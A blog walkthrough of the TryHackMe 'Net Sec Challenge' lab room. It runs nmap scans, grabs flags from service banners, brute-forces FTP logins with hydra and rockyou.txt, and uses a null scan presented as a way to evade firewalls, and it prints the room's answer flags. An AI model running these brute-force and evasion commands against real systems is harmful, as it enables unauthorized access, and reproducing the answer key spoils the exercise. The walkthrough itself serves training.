---
title: "Net Sec Challenge: THM Walkthrough"
subtitle: "Challenge to test your network security skills."
date: 2025-07-25
tags: [tryhackme]
---

This is a walkthrough for the TryHackMe room [Network Security Challenge Room](https://tryhackme.com/room/netsecchallenge). This challenge is designed to use [nmap](/docs/networking/nmap.md), [telnet](/docs/networking/telnet.md), [ftp](/docs/networking/ftp.md) and [hydra](/docs/security/tools/hydra.md) to find flags and learn about network security.
<!-- truncate -->

### Information Gathering

Start the machine and save IP address for the room.

```sh
export IP=10.10.164.150
```

Let's use [ping](https://en.wikipedia.org/wiki/Ping_(networking_utility)) to check if the machine is reachable.

```sh
ping $IP
64 bytes from 10.10.164.150: icmp_seq=0 ttl=63 time=21.815 ms
```

**1. What is the highest port number being open less than 10,000?**

Let's use [nmap](/docs/networking/nmap) to scan the target for the first 10.000 ports.

```sh
nmap -p1-10000 -T4 $IP
#     |         |-> -T4 for faster execution
#     |-> -p1-10000 to scan ports from 1 to 10.000
Nmap scan report for 10.10.164.150
Host is up (0.022s latency).
Not shown: 9995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 49.03 seconds
```

**Answer:** 8080

**2. There is an open port outside the common 1000 ports; it is above 10,000. What is it?**

Let's use `-p-` to scan all ports (65535 ports) and see if there are any other open ports.

```sh
nmap -p- -T4 $IP
#     |   |-> -T4 for faster execution
#     |-> -p- to scan all ports
Nmap scan report for 10.10.164.150
Host is up (0.021s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
8080/tcp  open  http-proxy
10021/tcp open  unknown
```

**Answer:** 10021

**3. How many TCP ports are open?**

```sh
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
8080/tcp  open  http-proxy
10021/tcp open  unknown
```

**Answer:** 6

**4. What is the flag hidden in the HTTP server header?**

Let's use nmap [http-header](https://nmap.org/nsedoc/scripts/http-headers.html) scanning script to find the HTTP server header.

```sh
nmap -p 80 --script=http-headers $IP
#     |             |-> -http-headers script to scan HTTP headers
#     |-> -p 80 to scan port 80
PORT   STATE SERVICE VERSION
80/tcp open  http    lighttpd
|_http-server-header: lighttpd THM{web_server_25352}
| http-headers:
|   Content-Type: text/html
|   Accept-Ranges: bytes
|   ETag: "229449419"
|   Last-Modified: Tue, 14 Sep 2021 07:33:09 GMT
|   Content-Length: 226
|   Connection: close
|   Date: Mon, 28 Jul 2025 10:35:10 GMT
|   Server: lighttpd THM{web_server_25352}
|
|_  (Request type: HEAD)
```

**Answer:** `THM{web_server_25352}`

**5. What is the flag hidden in the SSH server header?**

Let's use nmap [ssh-auth-methods](https://nmap.org/nsedoc/scripts/ssh-auth-methods.html) script to find our flag.

```sh
nmap -p 22 --script=ssh-auth-methods $IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.95%I=7%D=7/28%Time=6887538E%P=arm-apple-darwin24.2.0%r(N
SF:ULL,2A,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\x20\r\n");
```

Also, the SSH service is unrecognized because of its modified banner because it contains our flag.

**Answer:** `THM{946219583339}`

**6. We have an FTP server listening on a nonstandard port. What is the version of the FTP server?**

```sh
nmap -sV -p- -T4 $IP
#     |   |   |-> -T4 for faster execution
#     |   |-> -p- to scan all ports
#     |-> -sV for service version detection
...
10021/tcp open  ftp         vsftpd 3.0.5
...
```

Answer: `vsftpd 3.0.5`

**7. We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?**

Let's use [Hydra](/docs/security/tools/hydra) to brute force the FTP service on port `10021`. We will use the usernames **`eddie`** and **`quinn`** that we learned about, and the password list [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt). I added the usernames to a file called `user-list`.

```sh
hydra -L user-list -P rockyou.txt -s 10021 ftp://$IP
#      |            |              |        |-> ftp://$IP to specify the FTP service
#      |            |              |-> -s 10021 to specify the port
#      |            |-> -P to specify a file with passwords
#      |-> -L to specify a file with usernames   
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688796 login tries (l:2/p:14344398), ~1793050 tries per task
[DATA] attacking ftp://10.10.164.150:10021/
[10021][ftp] host: 10.10.164.150   login: eddie   password: jordan
[10021][ftp] host: 10.10.164.150   login: quinn   password: andrea
1 of 1 target successfully completed, 2 valid passwords found
```

We successfully brute-forced the FTP service and found two valid credentials:

- Username: `eddie`, Password: `jordan`
- Username: `quinn`, Password: `andrea`

Now, let's connect to the FTP service using the `eddie` user and `quinn` users to see if we can find any flags.

Nothing discovered on the `eddie` user.

But we found a filename `ftp_flag.txt` in the `quinn` user and downloaded it to our machine.

```sh
ftp 10.10.164.150 10021
Connected to 10.10.164.150.
220 (vsFTPd 3.0.5)
Name (10.10.164.150:root): quinn
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
226 Directory send OK.
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
226 Transfer complete.
18 bytes received in 0.00 secs (39.4128 kB/s)
```

```sh
cat ftp_flag.txt 
THM{321452667098}
```

**Answer:** `THM{321452667098}`

**8. Browsing to [http://10.10.164.150:8080](http://10.10.164.150:8080) displays a small challenge that will give you a flag once you solve it. What is the flag?**

Null Scan doesn't set any TCP flags, so it is useful to bypass firewalls and packet filters that block certain types of traffic. Let's use nmap with the `-sN` option to perform a null scan on port `8080`.

```sh
nmap -sN 10.10.164.150
Nmap scan report for 10.10.164.150
Host is up (0.027s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
80/tcp   open|filtered http
139/tcp  open|filtered netbios-ssn
445/tcp  open|filtered microsoft-ds
8080/tcp open|filtered http-proxy
```

**Answer:** `THM{f7443f99}`

### Conclusion

This room was a great practice for network security skills, including using tools like nmap, telnet, ftp, and hydra to find flags and learn about network security.
The advanced technique like null scan was a nice touch to bypass firewalls and packet filters, sometimes we need to avoid detection and remain "stealthy" if possible.

### Links

- [TryHackMe: Nmap Advanced Port Scans](https://tryhackme.com/room/nmap03)
